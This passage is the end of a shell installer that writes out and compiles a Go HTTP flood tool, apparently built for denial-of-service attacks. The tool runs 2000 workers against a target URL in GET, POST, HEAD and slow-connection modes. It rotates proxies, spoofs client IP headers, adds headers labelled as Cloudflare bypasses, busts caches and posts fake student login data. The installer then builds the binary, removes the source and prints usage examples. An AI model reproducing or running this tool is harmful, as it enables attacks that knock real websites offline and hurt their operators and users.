	return hex.EncodeToString(challenge)
}

func generateAltSvcHeader() string {
	altSvcs := []string{
		"h3=\":443\"; ma=86400",
		"h3=\":443\"; ma=86400, h3-29=\":443\"; ma=86400",
		"h2=\":443\"; ma=86400",
	}
	return altSvcs[randInt(0, len(altSvcs)-1)]
}

func generateCacheControlExtended() string {
	controls := []string{
		"max-age=0, no-cache, no-store, must-revalidate",
		"private, no-cache, no-store, max-age=0",
		"public, max-age=31536000, immutable",
		"no-cache, no-store, private",
		"must-revalidate, max-age=0",
	}
	return controls[randInt(0, len(controls)-1)]
}

func generateContentSecurityPolicy() string {
	policies := []string{
		"default-src 'self'",
		"default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'",
		"default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'",
		"upgrade-insecure-requests",
	}
	return policies[randInt(0, len(policies)-1)]
}

func generateFeaturePolicy() string {
	policies := []string{
		"camera 'none'; microphone 'none'; geolocation 'none'",
		"fullscreen 'self'",
		"payment 'none'",
	}
	return policies[randInt(0, len(policies)-1)]
}

func generateRequestID() string {
	id := make([]byte, 16)
	rand.Read(id)
	return hex.EncodeToString(id)
}

func generateCloudflareHeaders(req *http.Request) {
	if randInt(1, 100) <= 40 {
		cfHeader := cloudflareBypassHeaders[randInt(0, len(cloudflareBypassHeaders)-1)]
		for k, v := range cfHeader {
			if v == "" {
				switch k {
				case "CF-Access-Client-Id":
					req.Header.Set(k, randomString(32))
				case "CF-Access-Client-Secret":
					req.Header.Set(k, randomString(64))
				case "CF-Authorization":
					req.Header.Set(k, "Bearer "+randomString(40))
				case "CF-Ray":
					req.Header.Set(k, generateCFRay())
				case "CF-WARP-Tag":
					req.Header.Set(k, randomString(20))
				case "CF-Connecting-IP":
					req.Header.Set(k, randomIP())
				case "CF-IPCountry":
					req.Header.Set(k, randomCountryCode())
				case "CF-Challenge":
					req.Header.Set(k, generateCFChallenge())
				default:
					req.Header.Set(k, randomString(16))
				}
			} else {
				req.Header.Set(k, v)
			}
		}
	}
	
	if randInt(1, 100) <= 60 {
		sophHeader := sophisticatedHeaders[randInt(0, len(sophisticatedHeaders)-1)]
		for k, v := range sophHeader {
			req.Header.Set(k, v)
		}
	}

	
	if randInt(1, 100) <= 25 {
		req.Header.Set("X-Request-Start", fmt.Sprintf("%d", time.Now().UnixNano()/1000000))
		req.Header.Set("X-Request-ID", generateRequestID())
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST")
		fmt.Println("  ./main https://target.com 30 HEAD")
		fmt.Println("  ./main https://target.com 60 SLOW")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	fmt.Println("[+] Starting... Press Ctrl+C to stop")

	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, "")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	const workers = 2000

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, useProxy, connectionPool)
		}()
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, generateRandomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", generateRandomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")

			randomSpoofIP := randomIP()
			req.Header.Set("X-Forwarded-For", randomSpoofIP)
			req.Header.Set("X-Real-IP", randomSpoofIP)
			req.Header.Set("CF-Connecting-IP", randomSpoofIP)
			req.Header.Set("X-Forwarded", randomSpoofIP)
			req.Header.Set("Forwarded-For", randomSpoofIP)

			numSecurity := randInt(1, 2)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			numModern := randInt(2, 4)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}

			if randInt(1, 100) <= 50 {
				numApp := randInt(1, 2)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							req.Header.Set(k, randomString(32))
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if randInt(1, 100) <= 50 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			// Add Cloudflare bypass headers
			generateCloudflareHeaders(req)

			// Add randomized WebSocket upgrade headers occasionally
			if randInt(1, 100) <= 15 {
				wsHeader := websocketHeaders[randInt(0, len(websocketHeaders)-1)]
				for k, v := range wsHeader {
					if v == "" {
						if k == "Sec-WebSocket-Key" {
							req.Header.Set(k, generateWebSocketKey())
						} else {
							req.Header.Set(k, randomString(16))
						}
					} else {
						req.Header.Set(k, v)
					}
				}
			}

			// Add Alt-Svc header for HTTP/3 hinting
			if randInt(1, 100) <= 20 {
				req.Header.Set("Alt-Svc", generateAltSvcHeader())
			}

			// Add enhanced cache control
			if randInt(1, 100) <= 40 {
				req.Header.Set("Cache-Control", generateCacheControlExtended())
			}

			// Add security policy headers
			if randInt(1, 100) <= 25 {
				req.Header.Set("Content-Security-Policy", generateContentSecurityPolicy())
				req.Header.Set("Feature-Policy", generateFeaturePolicy())
			}

			// Add priority headers
			if randInt(1, 100) <= 30 {
				req.Header.Set("Priority", "u=0, i")
				req.Header.Set("Sec-Fetch-User", "?1")
			}

			// Add viewport and device information
			if randInt(1, 100) <= 20 {
				req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 3840)))
				req.Header.Set("Device-Memory", strconv.Itoa(randInt(2, 8)))
				req.Header.Set("RTT", strconv.Itoa(randInt(50, 300)))
				req.Header.Set("Downlink", fmt.Sprintf("%.1f", float64(randInt(1, 100))/10))
				req.Header.Set("ECT", []string{"4g", "3g", "2g", "slow-2g"}[randInt(0, 3)])
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
